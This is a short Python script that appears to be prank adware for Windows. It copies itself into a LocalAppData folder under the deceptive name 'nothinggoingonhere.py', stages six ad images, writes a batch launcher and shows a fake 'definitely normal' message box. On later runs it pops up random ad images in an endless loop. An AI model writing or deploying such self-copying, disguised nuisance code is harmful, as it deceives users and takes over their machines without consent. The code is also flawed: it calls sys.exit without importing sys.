import shutil
import os
import ctypes
import cv2
import random
import time

path = f"{os.getenv('LOCALAPPDATA')}\\RoutineProcessing"
print(path)
alreadyExits = os.path.isfile(f"{path}\\nothinggoingonhere.py")
pythonPath = f"{os.getenv('LOCALAPPDATA')}\Programs\Python\Python311\pythonw.exe"
img1 = cv2.imread("Add1.png", cv2.IMREAD_ANYCOLOR)
img2 = cv2.imread("Add2.png", cv2.IMREAD_ANYCOLOR)
img3 = cv2.imread("Add3.png", cv2.IMREAD_ANYCOLOR)
img4 = cv2.imread("Add4.png", cv2.IMREAD_ANYCOLOR)
img5 = cv2.imread("Add5.png", cv2.IMREAD_ANYCOLOR)
img6 = cv2.imread("Add6.png", cv2.IMREAD_ANYCOLOR)
Adds = [img1, img2, img3, img4, img5, img6]


def main():
    if alreadyExits is False:
        if not os.path.exists(path):
            os.makedirs(path)
        shutil.copy2(__file__, f"{path}\\nothinggoingonhere.py")
        shutil.copy("Add1.png", path)
        shutil.copy("Add2.png", path)
        shutil.copy("Add3.png", path)
        shutil.copy("Add4.png", path)
        shutil.copy("Add5.png", path)
        shutil.copy("Add6.png", path)
        fp = open('test.bat', 'w')
        fp.write(f'''@echo off
"{pythonPath}" "{path}\\nothinggoingonhere.py" 
pause''')
        Normal()
    else:
        print("Passed")
        TomFoolery()


def Normal():
    ctypes.windll.user32.MessageBoxW(0, 'HELLO THIS IS DEFINETLY NORMAL', 'UNSUSPICIOUS WINDOW', 0)


def TomFoolery():
    while True:
        timer = random.randint(1, 120)
        add = random.randint(1, 6) - 1
        print(timer)
        # time.sleep(timer)
        cv2.imshow("A", Adds[add])
        cv2.waitKey(0)

    sys.exit()


main()
